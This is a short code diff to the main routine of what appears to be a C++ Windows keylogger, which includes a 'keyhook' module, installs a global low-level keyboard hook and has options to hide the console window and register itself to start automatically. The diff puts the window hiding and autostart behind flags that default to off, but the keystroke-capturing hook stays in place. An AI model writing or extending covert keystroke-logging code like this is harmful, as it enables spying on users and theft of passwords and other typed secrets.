@@ -2,17 +2,17 @@
 #include "keyhook.cpp"
 #include "functions.cpp"
 
-int main(int argc, const char* argv[])
-{
-	//begin routine
+int main(int argc, const char* argv[]) {
+	bool hideWindow = false;
+	bool rootStartup = false;
 
-	/*
-	if (IsWindowVisible(::GetConsoleWindow()) != FALSE) {
+	//begin routine
+	
+	if (IsWindowVisible(::GetConsoleWindow()) != FALSE && hideWindow) {
 		ShowWindow(::GetConsoleWindow(), SW_HIDE);
 	}
-	*/
 
-	autoStart();
+	if(rootStartup) autoStart();
 
 	HHOOK lowlevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 	MSG msg;
